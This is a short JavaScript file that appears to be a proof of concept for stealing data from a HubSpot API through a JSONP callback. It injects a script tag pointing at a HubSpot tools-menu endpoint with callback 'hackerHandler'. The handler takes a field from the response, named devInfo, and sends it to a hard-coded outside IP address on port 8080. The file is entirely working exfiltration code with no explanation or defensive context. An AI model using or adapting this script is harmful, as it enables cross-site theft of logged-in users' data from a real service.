window.history.replaceState(null, '', '/attacker');

function hackerHandler(e) {
	var devInfo = e.actions[4][1]
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'http://212.71.234.194:8080/'+devInfo)
	xhr.send()
}

o = document.createElement("script");
o.type = "text/javascript";
o.referrerPolicy = "no-referrer-when-downgrade";
o.async = !0;
o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=hackerHandler";
document.getElementsByTagName("head")[0].appendChild(o)

